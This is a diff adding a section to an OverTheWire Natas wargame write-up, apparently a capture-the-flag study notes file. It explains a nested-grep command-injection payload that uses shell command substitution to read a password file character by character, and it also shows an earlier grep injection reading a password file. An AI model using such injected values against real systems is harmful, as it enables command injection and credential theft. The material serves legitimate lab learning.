@@ -460,3 +460,21 @@ grep .* /etc/natas_webpass/natas11 dictionary.txt
 ```
 `.*` forces grep to read every line of both the files <br>
 Refer: OverTheWire-Writeups/natas10.md
+## Nested Grep
+User input is passed into:
+```sh
+grep -i "USER_INPUT" dictionary.txt
+```
+Input contains **command substitution**:
+```bash
+$(...)
+```
+### Payload Pattern
+```text
+anythings$(grep ^PREFIX /etc/natas_webpass/natas17)
+```
+### Execution Order
+1. Shell executes `$(grep ^PREFIX /etc/natas_webpass/natas17)`
+2. Output (or empty string) is substituted
+3. Outer `grep` runs
+4. You observe outer grep’s output, not inner grep’s output
